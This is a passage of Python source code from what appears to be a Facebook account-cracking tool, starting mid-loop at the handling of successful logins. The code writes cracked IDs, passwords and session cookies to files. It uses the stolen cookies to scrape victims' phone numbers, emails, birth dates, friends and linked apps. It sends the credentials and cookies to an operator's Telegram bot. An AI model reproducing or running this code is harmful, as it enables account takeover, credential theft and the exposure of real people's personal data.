\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
\n(🏴༒🔱 نمــࢪود 🔱༒)  𖣬 \n:『@M_T_F 』⏎'\n\n\t\t\t\t\t
					'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					cek_SDMVIP(kuki)
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += f'''\n▄︻デ══━一 «𝗢𝗞✅ شـغال\n ࿐» ⏎
\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
\n (𝑆𝐷𝑀) જ⁀➴  \n- 𝐈𝐃 𖡲 : {idf}\n
 
\n(𝑆𝐷𝑀) જ⁀➴  \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}

\n(𝑆𝐷𝑀) જ⁀➴ \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  ッ \n:{kuki}
\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
\n(🏴༒🔱 نمــࢪود 🔱༒)  𖣬 \n:『@M_T_F 』⏎'''
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'''▄︻デ══━一 «𝗢𝗞✅ شـغال\n ࿐» ⏎
\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
\n (𝑆𝐷𝑀) જ⁀➴  \n- 𝐈𝐃 𖡲 : {idf}\n
 
\n(𝑆𝐷𝑀) જ⁀➴  \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}

\n(𝑆𝐷𝑀) જ⁀➴ \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  ッ \n:{kuki}
\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
\n(🏴༒🔱 نمــࢪود 🔱༒)  𖣬 \n:『@M_T_F 』⏎'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					cek_SDMVIP(kuki)
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def cek_SDMVIP(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:	 
		print ("\r    %s \033[0mcookie invalid"%(M))
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/SDM')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	
	SDM()
